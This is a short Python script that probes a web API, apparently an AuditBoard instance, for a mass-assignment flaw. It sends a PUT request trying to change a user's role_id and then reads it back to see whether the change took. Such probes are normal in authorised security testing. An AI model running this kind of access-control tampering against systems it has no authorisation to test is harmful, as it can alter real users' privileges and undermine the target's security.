import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or T),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== can role_id be mass-assigned? (set 230 -> role 11 low-priv) ===")
c,b=req('PUT','/api/v1/users/230',{"user":{"role_id":11}})
print("  PUT role_id=11 ->",c)
print("  ",b[:200].replace(chr(10),' '))
c,b=req('GET','/api/v1/users/230')
u=json.loads(b)['users'][0]
print("  read back role_id:",u['role_id'], "| CHANGED" if u['role_id']==11 else "| unchanged (not writable)")
